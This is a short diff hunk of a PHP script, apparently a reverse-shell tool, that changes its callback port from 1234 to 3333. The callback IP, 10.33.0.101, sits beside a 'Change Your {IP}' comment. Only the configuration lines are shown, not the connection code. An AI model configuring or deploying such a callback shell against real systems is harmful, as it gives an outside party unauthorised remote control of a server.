@@ -5,7 +5,7 @@
 set_time_limit (0);
 $VERSION 	= "1.0";
 $ip 		= '10.33.0.101'; 	// Change Your {IP}
-$port 		= 1234;       	// Change Your {Port}
+$port 		= 3333;       	// Change Your {Port}
 $chunk_size 	= 1400;
 $write_a 	= null;
 $error_a 	= null;
